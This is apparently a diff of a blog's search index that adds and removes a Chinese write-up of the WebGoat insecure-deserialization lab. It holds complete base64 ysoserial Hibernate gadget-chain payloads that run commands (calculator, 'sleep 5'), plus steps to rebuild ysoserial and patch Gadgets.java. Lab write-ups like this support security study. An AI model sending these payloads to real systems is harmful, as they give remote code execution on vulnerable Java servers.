ZABoAAgAbAAAABAABABwAAQAVAB4AAgAQAAAASQAAAAQAAAABsQAAAAIAEQAAAAYAAQAAADgAEgAAACoABAAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAfACAAAgAAAAEAIQAiAAMAGwAAAAQAAQAcAAgAKQAGAAEAEAAAACkAAwADAAAAFKcAAwFMuAAvEjG2ADVNLLYAO1exAAAAAQA8AAAAAwABAwACACMAAAACACQAJQAAAAoAAQAHACYAKAAJdXEAfgAuAAAB1Mr-ur4AAAA0ABsKAAIAAwcABAwABQAGAQAQamF2YS9sYW5nL09iamVjdAEABjxpbml0PgEAAygpVgcACAEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vBwAKAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAZAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAA0ZvbwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4AAQABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAADwAEgAAAAwAAQAAAAUAEwAUAAAAAgAVAAAAAgAWABcAAAAKAAEABwAYABoACXB0AARQd25ycHcBAHhxAH4ABXNxAH4AAnEAfgAScQB-ACtxAH4AMng</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>关键就两点：</p>
+<ol>
+<li>识别反序列化流量</li>
+<li>找到相应可利用执行命令的组件</li>
+</ol>
+<p>有时候需要特别修改ysoserial的内容来配合执行命令。</p>
+<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>可在<code>/WebGoat-develop/webgoat-container/src/main/resources/application.properties:6</code> 修改端口等信息</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/application-properties.png" alt="application-properties"></p>
+<p>更改反序列化payload为弹计算器，反序列化payload如下：</p>
+<p>（Mac下计算器路径是<code>/Applications/Calculator.app/Contents/MacOS/Calculator</code>）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGV-e2Nh9AnXEQIADVoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHRyYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS90dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJuYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1sADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQAAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7WwAhcHJvcGVydHlWYWx1ZUdlbmVyYXRpb25TdHJhdGVnaWVzdAAmW0xvcmcvaGliZXJuYXRlL3R1cGxlL1ZhbHVlR2VuZXJhdGlvbjtMAAl0eXBlU2NvcGV0ACpMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGVGYWN0b3J5JFR5cGVTY29wZTt4cgAfb3JnLmhpYmVybmF0ZS50eXBlLkFic3RyYWN0VHlwZYdFsKQmRS24AgAAeHAAAAAAAAFwcHNyADNvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5Qb2pvQ29tcG9uZW50VHVwbGl6ZXLAqqGhlZ9DmwIABEwADmNvbXBvbmVudENsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAAlvcHRpbWl6ZXJ0ADBMb3JnL2hpYmVybmF0ZS9ieXRlY29kZS9zcGkvUmVmbGVjdGlvbk9wdGltaXplcjtMAAxwYXJlbnRHZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxwYXJlbnRTZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cgA3b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcgh6nmX_Q4R7AgAFWgASaGFzQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxpbnN0YW50aWF0b3J0ACJMb3JnL2hpYmVybmF0ZS90dXBsZS9JbnN0YW50aWF0b3I7WwAHc2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cAAAAAAAdXIAK1tMb3JnLmhpYmVybmF0ZS5wcm9wZXJ0eS5hY2Nlc3Muc3BpLkdldHRlcjsmhfgDST23zwIAAHhwAAAAAXNyAD1vcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyTWV0aG9kSW1wbCRTZXJpYWxGb3JtrFu2VsndG1gCAARMAA5jb250YWluZXJDbGFzc3EAfgAUTAAOZGVjbGFyaW5nQ2xhc3NxAH4AFEwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAxwcm9wZXJ0eU5hbWVxAH4AIHhwdnIAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAgTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHBxAH4AJnQAE2dldE91dHB1dFByb3BlcnRpZXN0AAR0ZXN0cHBwcHBwcHBwcHVyABpbTG9yZy5oaWJlcm5hdGUudHlwZS5UeXBlO36vq6HklWGaAgAAeHAAAAABcQB-ABJwcHNxAH4AIgAAAAD_____dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX-AYIVOACAAB4cAAABwDK_rq-AAAANAA_CgACAAMHAAQMAAUABgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBAAY8aW5pdD4BAAMoKVYHAD0BADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQHAAoBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAHQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQA2L0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9yCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBABFqYXZhL2xhbmcvUHJvY2VzcwcANgEAB3dhaXRGb3IBAAMoKUkMADgAOQoANwA6AQANU3RhY2tNYXBUYWJsZQEAHXlzb3NlcmlhbC9Qd25lcjI4MzEwMDEyMDg1NDQ0AQAfTHlzb3NlcmlhbC9Qd25lcjI4MzEwMDEyMDg1NDQ0OwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4ABAABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAAC8AEgAAAAwAAQAAAAUAEwA-AAAAAQAVABYAAgAQAAAAPwAAAAMAAAABsQAAAAIAEQAAAAYAAQAAADQAEgAAACAAAwAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAZABoAAgAbAAAABAABABwAAQAVAB4AAgAQAAAASQAAAAQAAAABsQAAAAIAEQAAAAYAAQAAADgAEgAAACoABAAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAfACAAAgAAAAEAIQAiAAMAGwAAAAQAAQAcAAgAKQAGAAEAEAAAACkAAwADAAAAFKcAAwFMuAAvEjG2ADVNLLYAO1exAAAAAQA8AAAAAwABAwACACMAAAACACQAJQAAAAoAAQAHACYAKAAJdXEAfgAuAAAB1Mr-ur4AAAA0ABsKAAIAAwcABAwABQAGAQAQamF2YS9sYW5nL09iamVjdAEABjxpbml0PgEAAygpVgcACAEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vBwAKAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAZAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAA0ZvbwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4AAQABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAADwAEgAAAAwAAQAAAAUAEwAUAAAAAgAVAAAAAgAWABcAAAAKAAEABwAYABoACXB0AARQd25ycHcBAHhxAH4ABXNxAH4AAnEAfgAScQB-ACtxAH4AMng</span><br></pre></td></tr></table></figure>
+
+<p><code>/Users/seikei/.m2/repository/org/hibernate/hibernate-core/5.0.12.Final/hibernate-core-5.0.12.Final.jar!/org/hibernate/engine/spi/TypedValue.class</code></p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/TypeValue.png" alt="TypeValue"></p>
+<p><code>/Users/seikei/.m2/repository/org/hibernate/hibernate-core/5.0.12.Final/hibernate-core-5.0.12.Final.jar!/org/hibernate/property/access/spi/GetterMethodImpl.class</code></p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/GetterMethodImpl.png" alt="GetterMethodImpl"></p>
+<p><code>/Applications/IntelliJ IDEA.app/Contents/jbr/Contents/Home!/java.xml/jdk/xml/internal/JdkXmlFeatures.class</code></p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/JdkXmlFeatures.png" alt="JdkXmlFeatures"></p>
+<h2 id="Java报错"><a href="#Java报错" class="headerlink" title="Java报错"></a>Java报错</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Error:java: error: release version 5 not supported</span><br></pre></td></tr></table></figure>
+
+<p>在maven中添加</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
   </entry>
   <entry>
     <title>理解Java反序列化-ysoserial URLDNS</title>
@@ -1116,77 +1316,6 @@
 <p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/Do-step-into-the-classes.png" alt="Do-step-into-the-classes"></p>
 <p>设置之后调试时不会自动跳过 <code>java.*</code> 和 <code>javax.*</code> 类。</p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>WebGoat - 不安全的反序列化</title>
-    <url>/2019/09/28/WebGoat-Deserialization/</url>
-    <content><![CDATA[<p>Webgoat有一道不安全反序列化的题，如下：</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/webgoat-insecure-deserialization.png" alt="webgoat-insecure-deserialization.png"></p>
-<p>最初看到这题有点迷茫，不知道该怎么下手，正是迷茫才能从中学到反序列。从网上找了一些文章，自己也动手完全整了一遍，在此记录。<a id="more"></a>（网上特别详细的文章也没有，所以很多坑都是一步一个脚印踩上去的）</p>
-<p>最早的一篇讲解Webgoat反序列化的文章</p>
-<p><a href="https://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef" target="_blank" rel="noopener">https://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef</a></p>
-<p>上一篇文章的中文翻译，其中有部分作者的改动</p>
-<p><a href="https://blog.spoock.com/2018/10/31/reverse-shell-on-limited-environments/" target="_blank" rel="noopener">https://blog.spoock.com/2018/10/31/reverse-shell-on-limited-environments/</a></p>
-<p>另一篇文章</p>
-<p><a href="https://www.jianshu.com/p/0c45058e1723" target="_blank" rel="noopener">https://www.jianshu.com/p/0c45058e1723</a></p>
-<h2 id="正文开始"><a href="#正文开始" class="headerlink" title="正文开始"></a>正文开始</h2><p>安装Burp插件Java Deserialization Scanner，被动扫描发现存在不安全反序列化漏洞</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-detect.png" alt="deserialization-detect"></p>
-<p>将请求Send request to DS - Manual testing 进行测试，发现存在Hibernate 5类型的反序列化</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-manual-testing.png" alt="deserialization-manual-testing"></p>
-<p>然后将请求Send request to DS - Exploitation</p>
-<p>坑点一：使用原始的ysoserial.jar执行会报错，需要重新编译ysoserial</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-exploiting.png" alt="deserialization-exploiting"></p>
-<p>详细报错信息如下所示</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-error.png" alt="deserialization-error"></p>
-<p>在GitHub项目里下载源码，无需修改（因为源码里面已经添加了，但是作者并没有将它打包放在releases里）。GitHub地址：<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p>
-<p><code>mvn clean package -DskipTests -Dhibernate5</code>即可构建代码（亲测不加-Dhibernate5不行)</p>
-<p>在插件中配置好构建完成的jar包路径，即可正常执行反序列化payload。</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-exploiting-2.png" alt="deserialization-exploiting-2"></p>
-<p>坑点二：Mac下该Java 版本执行ysoserial.jar会提示</p>
-<blockquote>
-<p>com.nqzero.permit.Permit$InitializationFailed: initialization failed, perhaps you’re running with a security manager</p>
-</blockquote>
-<p><img src="/2019/09/28/WebGoat-Deserialization/java-version.png" alt="java-version"></p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/ysoserial-hibernate-error.png" alt="ysoserial-hibernate-error"></p>
-<p>需要在pom.xml中将nqzero版本改为0.4（原始为0.3），重新使用maven构建即可使用。</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/nqzero.png" alt="nqzero.png"></p>
-<p>最开始碰到这个问题还以为在Mac下或者是Java版本太高不能用了，于是在Windows下执行，但是Windows执行后不能立马进行base64，还需要将ysoserial的输出保存在文件中，再将文件内容base64编码，觉得太麻烦。这个问题在谷歌中查也查不到解决办法。</p>
-<p>在IntelliJ IDEA中查看pom.xml文件时发现存在com.nqzero这个包，报错信息也是com.nqzero.permit.Permit$InitializationFailed，于是想着会不会是这个包版本不对，在maven库中一查，果然最新是0.4版本的，于是换成0.4后使用maven构建后可正常使用。</p>
-<p>构建时发现Java版本为1.6，我的maven没法构建，将Java版本改为1.7或者1.8即可正常构建。</p>
-<p>坑点三：在Linux中，ysoserial的反序列化无法使用sleep命令，其他命令能执行，这不知道为什么，但是在其他人文章中发现windows下的sleep能执行。目前没有发现任何解决办法，这个稍后动态调试一下看看到底是什么问题导致的。</p>
-<p><em>PS：但是Deserialization Scanner中的payload是sleep十秒的，目前不清楚是怎么实现的。</em></p>
-<p><strong>请求在执行sleep后并未等待命令结束就已经返回结果</strong>，若要等待进程结束后返回，需要针对ysoserial的执行命令进行调整，重新生成payload进行测试。</p>
-<p>在ysoserial/payloads/util/Gadgets.java:117-119，将代码做以下修改，可实现sleep等待5秒</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">String cmd = <span class="string">"java.lang.Process p=java.lang.Runtime.getRuntime().exec(\\"</span><span class="string">" +</span></span><br><span class="line"><span class="string">            command.replaceAll("</span>\\\\\\\\",<span class="string">"\\\\\\\\\\\\\\\\"</span>).replaceAll(<span class="string">"\\"</span><span class="string">", "</span>\\\\\\"<span class="string">") +</span></span><br><span class="line"><span class="string">            "</span>\\");p.waitFor();<span class="string">";</span></span><br></pre></td></tr></table></figure>
-
-<p>最终效果图如下：</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-exploiting-success.png" alt="deserialization-exploiting-success"></p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/webgoat-insecure-deserialization-complete.png" alt="webgoat-insecure-deserialization-complete"></p>
-<p>payload也贴一下吧</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGV-e2Nh9AnXEQIADVoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHRyYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS90dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJuYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1sADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQAAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7WwAhcHJvcGVydHlWYWx1ZUdlbmVyYXRpb25TdHJhdGVnaWVzdAAmW0xvcmcvaGliZXJuYXRlL3R1cGxlL1ZhbHVlR2VuZXJhdGlvbjtMAAl0eXBlU2NvcGV0ACpMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGVGYWN0b3J5JFR5cGVTY29wZTt4cgAfb3JnLmhpYmVybmF0ZS50eXBlLkFic3RyYWN0VHlwZYdFsKQmRS24AgAAeHAAAAAAAAFwcHNyADNvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5Qb2pvQ29tcG9uZW50VHVwbGl6ZXLAqqGhlZ9DmwIABEwADmNvbXBvbmVudENsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAAlvcHRpbWl6ZXJ0ADBMb3JnL2hpYmVybmF0ZS9ieXRlY29kZS9zcGkvUmVmbGVjdGlvbk9wdGltaXplcjtMAAxwYXJlbnRHZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxwYXJlbnRTZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cgA3b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcgh6nmX_Q4R7AgAFWgASaGFzQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxpbnN0YW50aWF0b3J0ACJMb3JnL2hpYmVybmF0ZS90dXBsZS9JbnN0YW50aWF0b3I7WwAHc2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cAAAAAAAdXIAK1tMb3JnLmhpYmVybmF0ZS5wcm9wZXJ0eS5hY2Nlc3Muc3BpLkdldHRlcjsmhfgDST23zwIAAHhwAAAAAXNyAD1vcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyTWV0aG9kSW1wbCRTZXJpYWxGb3JtrFu2VsndG1gCAARMAA5jb250YWluZXJDbGFzc3EAfgAUTAAOZGVjbGFyaW5nQ2xhc3NxAH4AFEwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAxwcm9wZXJ0eU5hbWVxAH4AIHhwdnIAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAgTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHBxAH4AJnQAE2dldE91dHB1dFByb3BlcnRpZXN0AAR0ZXN0cHBwcHBwcHBwcHVyABpbTG9yZy5oaWJlcm5hdGUudHlwZS5UeXBlO36vq6HklWGaAgAAeHAAAAABcQB-ABJwcHNxAH4AIgAAAAD_____dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX-AYIVOACAAB4cAAABtPK_rq-AAAANAA_CgACAAMHAAQMAAUABgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBAAY8aW5pdD4BAAMoKVYHAD0BADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQHAAoBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAHQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAHc2xlZXAgNQgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQARamF2YS9sYW5nL1Byb2Nlc3MHADYBAAd3YWl0Rm9yAQADKClJDAA4ADkKADcAOgEADVN0YWNrTWFwVGFibGUBAB55c29zZXJpYWwvUHduZXIxMzkwODU2MDU4NzM2MTYBACBMeXNvc2V